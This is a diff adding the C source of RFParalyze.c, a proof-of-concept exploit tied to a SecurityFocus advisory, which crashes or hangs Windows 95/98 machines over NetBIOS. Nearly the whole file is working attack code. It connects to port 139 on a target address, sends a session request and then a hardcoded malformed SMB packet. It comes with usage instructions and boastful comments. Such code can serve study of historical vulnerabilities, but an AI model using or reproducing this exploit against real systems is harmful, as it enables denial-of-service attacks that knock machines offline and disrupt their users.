@@ -1,0 +1,136 @@
+source: http://www.securityfocus.com/bid/1163/info
+
+Unpredictable results, including system crashes, lock-ups, reboots, and loss of network connectivity, can occur in Windows 95/98 if a NetBIOS session packet is received with the source host name set to NULL.
+
+/*********************************** www.el8.org **** www.wiretrip.net **/
+
+/* 	- el8.org advisory: RFParalyze.c 
+
+	code by rain forest puppy <rfp@wiretrip.net>   -
+   	coolness exhibited by Evan Brewer <dm@el8.org> -
+
+	- Usage: RFParalyze <IP address> <NetBIOS name>
+
+	where <IP address> is the IP address (duh) of the target (note:
+	not DNS name).  <NetBIOS name> is the NetBIOS name (again, duh) of
+	the server at the IP address given.  A kiddie worth his scripts
+	should be able to figure out how to lookup the NetBIOS name.  
+	Note: NetBIOS name must be in upper case.
+
+	This code was made from a reverse-engineer of 'whisper', a 
+	binary-only exploit found in the wild.
+
+	I have only tested this code on Linux.  Hey, at least it's
+	not in perl... ;)   -rfp
+
+*/
+
+#include <stdio.h>		/* It's such a shame to waste   */
+#include <stdlib.h>		/* this usable space. Instead,  */
+#include <string.h>		/* we'll just make it more      */
+#include <netdb.h>		/* props to the men and women   */
+#include <sys/socket.h>		/* (hi Tabi!) of #!adm and      */
+#include <sys/types.h>		/* #!w00w00, because they rock  */
+#include <netinet/in.h>		/* so much.  And we can't forget*/
+#include <unistd.h>		/* our friends at eEye or       */
+#include <string.h>		/* Attrition. Oh, +hi Sioda. :) */
+
+/* 	Magic winpopup message
+	This is from \\Beav\beavis and says "yeh yeh"
+	Ron and Marty should like the hardcoded values this has ;)  
+*/
+char blowup[]= "\x00\x00\x00\x41\xff\x53\x4d\x42\xd0\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x19\x00\x04\x42\x45\x41\x56\x00\x04\x42\x45\x41\x56\x49"
+"\x53\x00\x01\x08\x00\x79\x65\x70\x20\x79\x65\x70\x00\x00";
+
+struct sreq /* little structure of netbios session request */
+        {
+        char first[5];  
+        char yoname[32];
+        char sep[2];
+        char myname[32];
+        char end[1];
+        };
+
+void Pad_Name(char *name1, char *name2); /* Thanks Antilove/ADM 4 codez!*/
+
+int main(int argc, char *argv[]){
+char buf[4000], myname[33], yoname[33];
+struct sockaddr_in sin;
+int sox, connex, x;
+struct sreq smbreq;
+
+printf("RFParalyze -- this code by rfp/ADM/Wiretrip/ and dm/el8/\n");
+
+if (argc < 3) {
+printf("Usage: RFParalyze <IP of target> <NetBIOS name>\n");
+printf("       --IP must be ip address, not dns\n");
+printf("       --NetBIOS name must be in UPPER CASE\n\n");
+exit(1);}
+
+printf("Greetz to el8.org, Technotronic, w00w00, USSR, and ADM!\n");
+
+Pad_Name("WICCA",myname);  /* greetz to Simple Nomad/NMRC */
+myname[30]='A';	           /* how was Beltaine? :)        */
+myname[31]='D';
+
+Pad_Name(argv[2],yoname);
+yoname[30]='A';
+yoname[31]='D';
+printf("Trying %s as NetBIOS name %s \n",argv[1],argv[2]);
+
+sin.sin_addr.s_addr = inet_addr(argv[1]);
+sin.sin_family      = AF_INET;
+sin.sin_port        = htons(139);
+
+sox = socket(AF_INET,SOCK_STREAM,0);
+if((connex = connect(sox,(struct sockaddr_in *)&sin,sizeof(sin))) < 0){
+    perror("Problems connecting: ");
+    exit(1);}
+
+memset(buf,0,4000);
+
+memcpy(smbreq.first,"\x81\x00\x00\x44\x20",5); /*various netbios stuffz*/
+memcpy(smbreq.sep,"\x00\x20",2);               /*no need to worry about*/
+memcpy(smbreq.end,"\x00",1);                   /*what it does :)       */
+strncpy(smbreq.myname,myname,32);
+strncpy(smbreq.yoname,yoname,32);
+
+write(sox,&smbreq,72);  /* send initial request */
+x=read(sox,buf,4000);   /* get their response   */
+
+if(x<1){ printf("Problem, didn't get response\n");
+        exit(1);}
+
+if(buf[0]=='\x82') printf("Enemy engaged, going in for the kill...");
+else {printf("We didn't get back the A-OK, bailing.\n");
+        exit(1);}
+
+write(sox,&blowup,72);  /* send the magic message >:)     */
+x=read(sox,buf,4000);   /* we really don't care, but sure */
+close(sox);
+printf("done\n");
+}
+
+void Pad_Name(char *name1, char *name2)
+{ char c, c1, c2;
+  int i, len;
+  len = strlen(name1);
+  for (i = 0; i < 16; i++) {
+    if (i >= len) {
+     c1 = 'C'; c2 = 'A'; /* CA is a space */
+    } else {
+      c = name1[i];
+      c1 = (char)((int)c/16 + (int)'A');
+      c2 = (char)((int)c%16 + (int)'A');
+    }
+    name2[i*2] = c1;
+    name2[i*2+1] = c2;
+  }
+  name2[32] = 0;   /* Put in the null ...*/
+}
+
+
+/*********************************** www.el8.org **** www.wiretrip.net **/
